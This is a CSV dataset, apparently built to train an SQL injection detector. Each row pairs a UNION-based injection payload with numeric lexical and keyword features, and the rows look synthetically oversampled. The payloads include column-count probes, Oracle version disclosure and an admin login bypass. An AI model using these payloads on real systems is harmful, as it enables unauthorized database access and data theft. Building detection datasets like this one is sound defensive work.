id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000412,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,0.04248724235335687,100.06175066106066,27.97529973557574,3.6649543910322953,25.0,40.04940052884852,22.0,13.01235013221213,0.24985297461652226,0.4002352406135644,0.21987061766253957,0.13004116710737376,0.9876498677878686,0.01235013221213127,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,6.0123501322121315,4.0,0.9876498677878685,0.012350132212131437,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000413,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.8233845193710674,103.6885881320309,27.270793032147004,4.00899933299765,58.042553292765916,5.18762090355899,27.916827871411982,12.541586064294007,0.5558401732139682,0.04908777257645455,0.2711066964712392,0.12396535773833806,3.0,0.5415860642940075,2.0,0.0,1.0,2.458413935705993,0.0,0.5415860642940074,0.0,0.0,1.0,5.729206967852996,1.0,0.2707930321470038,1.0,0.0,0.0,1.0,0.2707930321470038,0.0,0.0,0.0,0.0,2.0,1.0,1.7292069678529964,1.7292069678529962,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.458413935705993
SMOTE_000414,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.07224071906845289,109.31725136950651,28.0,4.1418378248947905,36.84394317017291,39.609857925432294,16.960985792543227,15.902464481358074,0.33734490279360974,0.36174476569906566,0.15543214107856299,0.14547819042876167,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.902464481358072,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.9804928962716142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.980492896271615
SMOTE_000415,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,1.4173543521792678,102.74272030206475,26.51455939587049,4.099319160332337,64.97088120825902,4.0,23.742720302064754,10.029118791740977,0.6323035622039221,0.038932906795330346,0.231075090792225,0.09768844020852253,0.7718390938057322,0.5145593958704882,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,6.742720302064756,0.25727969793524413,0.25727969793524424,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.742720302064756,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000416,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.033509369253725614,114.73471769970928,26.0,3.7099217134308704,25.0,51.78777415976742,22.0,15.946943539941856,0.21794054306478408,0.45129513109634545,0.19178767789701,0.13897664794186046,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.946943539941856,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.5319522024787198,110.78871500544358,26.0,3.7397200900087793,25.0,48.63097200435486,22.0,15.157743001088715,0.22611032089970273,0.4382234865604756,0.19897708239173842,0.13668911014808324,0.0,1.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.157743001088715,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,1.4249892464988518,75.43831627934638,30.643814500830437,4.459928611612908,33.794501778515944,23.643814500830437,11.849312722314494,6.150687277685507,0.44779951007715857,0.31174014797837635,0.15783661138889743,0.08262373055556774,0.15068727768550705,3.3972508892579723,0.4520618330565209,0.0,0.0,0.8493127223144931,0.0,0.15068727768550694,0.0,0.0,1.150687277685507,1.301374555371014,0.15068727768550694,0.8493127223144932,0.15068727768550683,0.0,0.0,0.8493127223144931,0.15068727768550694,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.8493127223144932,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.849312722314493
SMOTE_000419,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,1.3322257660901595,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,3.142999481689894,0.857000518310106,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.7857498704224735,0.21425012957752654,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.2641628054741447,92.69138140043876,28.88456907002194,4.291227198424196,32.53827628008775,30.614828840263257,15.884569070021938,13.653707210065814,0.35795022149494,0.31794603304475,0.1769242851298625,0.14717946033044751,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.653707210065814,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.442284535010969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.442284535010969
SMOTE_000421,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.7330476413145176,104.9900275030883,29.00199449938234,4.206399783294259,37.0,35.992022002470634,17.0,14.998005500617658,0.3541022949651419,0.34062404977495103,0.16269564903803818,0.14257800622186886,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.998005500617659,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000422,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.1345012346980136,104.40851785752318,28.074275974095126,4.036647906265279,29.2971038963805,44.0,15.074275974095125,16.03713798704756,0.28043911265513377,0.4215740145709849,0.1443642920939001,0.15362258067998125,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,7.0,5.037137987047562,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.03713798704756241,2.0,1.0,1.0,0.037137987047562326,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.037137987047562
SMOTE_000423,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.555277168988348,73.64189306188612,28.522524082514835,4.314821193394884,28.761262041257417,20.477475917485165,14.522524082514833,9.880631020628709,0.39050599395857466,0.27835846148766274,0.19700007350167603,0.13413547105208665,2.7612620412574165,0.0,3.0,0.0,0.0,0.8806310206287083,0.0,1.0,0.0,0.0,1.3581069381138748,4.7612620412574165,1.0,0.0,1.0,0.0,0.0,0.8806310206287083,1.0,0.0,0.0,0.0,0.0,1.8806310206287082,1.0,0.8806310206287085,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7612620412574165
SMOTE_000424,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.9752174436626447,94.26454203779697,28.7936261133909,4.225467105182266,31.11633630237573,33.88366369762427,15.529084075593932,13.735457962203034,0.32992876744985516,0.35963503630638194,0.16469941461801516,0.14573678162574777,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.470915924406068,5.264542037796966,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.26454203779696633,2.0,1.0,1.0,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.264542037796966
SMOTE_000425,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.6121416600549687,64.55731616587266,23.71146323317453,4.095349409478441,27.0,18.845852932698126,11.0,7.711463233174531,0.42044619337830486,0.2892357354515408,0.17129289359856864,0.11902517757158573,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.7114632331745314,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.2586316777885422,58.918073835728165,22.69156649418195,4.015162313472427,25.99759110609134,15.3831329883639,10.768674870636463,6.768674870636463,0.4402435216523197,0.2602130814457798,0.18456622705680542,0.11497716984509503,0.9228916235454876,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.8457832470909752,3.0,0.9228916235454876,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.6298285605751688,46.399821953104215,21.32496661620704,4.020244737097745,19.037427668448586,12.64993323241408,9.162483308103521,5.549977744138027,0.4107286245025815,0.26154151260126784,0.208701362232926,0.11902850066322462,0.38749443603450684,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.1624833081035204,3.0,0.38749443603450684,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000428,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,2.1250730990237727,92.52112349942706,27.684402833354554,3.9945726360892566,48.943137666199824,3.9467914999363387,26.262388666581785,13.368805666709108,0.5241673505989757,0.04150226463925047,0.2861446332590298,0.1481857515027441,3.0,1.3688056667091064,2.0,0.0,1.0,1.6311943332908934,0.0,1.3688056667091066,0.0,0.0,1.0,5.315597166645446,1.0,0.6844028333545534,1.0,0.0,0.0,1.0,0.6844028333545534,0.0,0.0,0.0,0.0,2.0,1.0,1.3155971666454467,1.3155971666454467,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.631194333290893
SMOTE_000429,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,1.0719475420911666,97.206290461408,25.318387113106823,4.0462234629356235,62.36473126990306,3.5455914087378844,22.75037637402918,8.545591408737883,0.6422614171671186,0.03442321756056199,0.23493984231725415,0.08837552295506532,0.0,0.0,1.7727957043689413,0.0,1.0,1.8863978521844706,0.0,0.0,0.0,0.0,0.8863978521844706,6.431989260922354,0.0,0.0,0.8863978521844708,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.886397852184471,1.8863978521844706,1.0,1.886397852184471,1.8863978521844709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11360214781552914,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.772795704368942
SMOTE_000430,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.648510845129807,103.04217929570768,27.884202300476925,4.158069412014948,62.23159539904614,4.231595399046153,23.694786197138452,12.884202300476925,0.6042225414563531,0.040933935128058346,0.22963240313609307,0.12521112027949535,3.0,1.7684046009538488,2.0,0.0,1.0,2.1157976995230756,0.0,0.0,0.0,0.0,1.0,6.0,1.0,0.8842023004769246,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.11579769952307561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.115797699523075
SMOTE_000431,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.8267892906213083,104.34935552166023,29.130128895667955,4.2149877278273875,37.0,35.47948441732818,17.0,14.869871104332045,0.3563707029376624,0.3376812502430326,0.16373789053892596,0.14221015628037909,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.869871104332045,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000432,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.9851042622225691,111.1346767850618,26.515376428658428,3.696465326108894,25.0,48.90774142804944,22.0,15.22693535701236,0.22579418090203954,0.4387293105567367,0.1986988791937948,0.13677762934742893,0.2576882143292132,0.7423117856707868,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,8.22693535701236,4.0,0.2576882143292132,0.7423117856707869,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.16672181895983698,84.66852157229735,27.975239941766766,3.984428246859295,42.544721281131174,3.0742801746997053,25.099040232932943,13.95047988353353,0.5018960404953379,0.03616837944636242,0.2967188267115973,0.16521675334670244,3.0,1.9504798835335297,2.0,0.0,1.0,1.04952011646647,0.0,1.95047988353353,0.0,0.0,1.0,5.024760058233235,1.0,0.975239941766765,1.0,0.0,0.0,1.0,0.975239941766765,0.0,0.0,0.0,0.0,2.0,1.0,1.024760058233235,1.024760058233235,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.04952011646647
SMOTE_000434,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.1917227552730687,43.699684032782244,20.57292173504577,3.958736058241487,17.407997092599167,12.194457960122053,8.786460867522885,5.310768112538142,0.40351131925825195,0.2622262213678094,0.21422626231711686,0.1200361970568218,0.2621536225076284,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0486144900305132,3.0,0.26215362250762847,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.6395046251891693,89.71986168920307,30.207979253380458,4.322344310072257,34.887944675681226,25.887944675681226,16.471986168920306,12.471986168920306,0.3887326121669057,0.2873261216690569,0.1845054087482073,0.1394358574158301,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.4719861689203064,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.7359930844601532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.735993084460153
SMOTE_000436,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,1.0315184151739987,102.14244542480438,27.535611356201095,4.03909828459235,28.535611356201095,44.0,14.071222712402191,15.535611356201095,0.2794043132737968,0.43126326134901916,0.13734680295650661,0.15198562242067748,2.5356113562010956,0.0,3.0,0.0,0.0,0.7678056781005479,0.0,1.0,0.0,0.0,7.4643886437989035,4.535611356201096,1.0,0.0,1.0,0.0,0.0,0.7678056781005479,1.0,0.0,0.0,0.0,0.0,1.7678056781005478,1.0,0.7678056781005479,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.535611356201096
SMOTE_000437,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.2942614242079493,94.92017727193982,30.760531815819487,4.3278473365035355,36.36141817551863,28.63858182448137,16.840354543879656,13.079822728060172,0.3830109930137174,0.30178054979971053,0.1774009706657996,0.13780748652077252,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.1596454561203426,5.920177271939829,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9201772719398288,2.0,1.0,1.0,0.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.920177271939829
SMOTE_000438,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000025,0.013732623790975146,65.95327049974809,20.009345900050384,3.586939160139646,14.0,35.96261639979846,4.0,11.990654099949618,0.21228370914146222,0.5452595490302453,0.06065248832613207,0.1818042535021604,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.990654099949618,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000001,0.7845739446028631,98.75950000528118,25.50111764768014,4.053303684096714,63.33929412096074,3.667411765120093,23.085382354080252,8.667411765120093,0.6418633857562357,0.03560593946718532,0.23442240148310642,0.08810827329347254,0.0,0.0,1.8337058825600459,0.0,1.0,1.916852941280023,0.0,0.0,0.0,0.0,0.9168529412800233,6.584264706400115,0.0,0.0,0.9168529412800229,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9168529412800233,1.916852941280023,1.0,1.9168529412800233,1.916852941280023,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08314705871997694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.8337058825600465
SMOTE_000440,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,0.04010686575416823,51.91957144189803,19.995531746772112,3.840271162608162,33.91063493544225,0.03574602582309794,12.977658733860563,4.995531746772113,0.652764472634878,0.0010513537006793805,0.24993429039370754,0.09624988327073514,0.0,0.0,0.01340475968366217,0.0,0.9955317467721126,0.9955317467721126,0.0,0.004468253227887353,0.0,0.0,0.0,2.0044682532278872,0.0,0.0,0.004468253227887353,0.0,0.0,0.9955317467721126,0.004468253227887353,0.0,0.0,0.0,0.0,1.0,1.0,0.9955317467721128,0.9955317467721125,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9955317467721126,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.986595240316338
SMOTE_000441,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,2.3983134975872793,43.40902374815026,19.55347198518531,3.912247835200418,14.0,16.855551762964954,5.786112059258761,6.767359925926549,0.3357979628177026,0.36552282004360226,0.14847498271602985,0.15020423442266528,0.5534719851853095,0.0,3.0,0.0,0.0,0.0,0.0,0.44652801481469034,0.5534719851853097,0.0,2.2138879407412384,3.0,0.5534719851853095,0.0,1.0,0.0,0.0,0.0,0.4465280148146905,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000442,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.22035085900300183,35.793482334062226,19.290834973091172,3.88362554931801,14.630142441697537,8.775559928243124,8.145417486545586,4.242362477575976,0.41023864554301787,0.24027389349120482,0.231398647833493,0.1180888131322843,0.04847249551519539,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.19388998206078156,3.0,0.04847249551519539,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
